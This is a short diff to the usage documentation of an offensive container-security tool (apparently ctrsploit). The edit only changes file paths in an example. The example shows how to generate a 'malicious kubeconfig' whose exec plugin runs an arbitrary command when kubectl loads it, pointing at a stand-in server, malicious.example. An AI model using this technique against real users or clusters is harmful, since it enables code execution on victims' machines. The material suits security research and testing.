@@ -68,12 +68,12 @@ VERSION="24.04.4 LTS (Noble Numbat)"
 ```bash
 # 1. Generate a malicious kubeconfig
 $ ctrsploit vul kubeconfig user-exec x -c 'id > /tmp/whoami'
-WARN  --output not set, saving to /root/malicious-kubeconfig.yaml
+WARN  --output not set, saving to malicious-kubeconfig.yaml
 INFO  Malicious kubeconfig written to /root/malicious-kubeconfig.yaml
 
 # 2. Load it with kubectl — client-go runs the exec plugin before
 #    making any network request to https://malicious.example
-$ kubectl --kubeconfig ~/malicious-kubeconfig.yaml get pods
+$ kubectl --kubeconfig malicious-kubeconfig.yaml get pods
 Unable to connect to the server: getting credentials: exec plugin is
 configured to use API version client.authentication.k8s.io/v1beta1,
 plugin returned version client.authentication.k8s.io/__internal
